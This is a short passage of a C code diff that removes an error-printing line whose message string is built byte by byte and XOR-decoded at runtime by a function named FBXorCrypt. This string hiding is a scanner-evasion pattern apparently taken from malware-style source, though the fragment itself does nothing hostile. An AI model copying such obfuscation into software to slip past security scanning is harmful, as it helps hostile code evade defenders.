-MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 103; _fuckingstring[1] = 115; _fuckingstring[2] = 100; _fuckingstring[3] = 100; _fuckingstring[4] = 59; _fuckingstring[5] = 33; _fuckingstring[6] = 49; _fuckingstring[7] = 121; _fuckingstring[8] = 36; _fuckingstring[9] = 121; _fuckingstring[10] = 11; _fuckingstring[11] = 1; FBXorCrypt(_fuckingstring, 12);
-printf(_fuckingstring, (unsigned int)GetLastError());
-
-//printf(
-
-return 1;
+	return 1;
 
 }
 
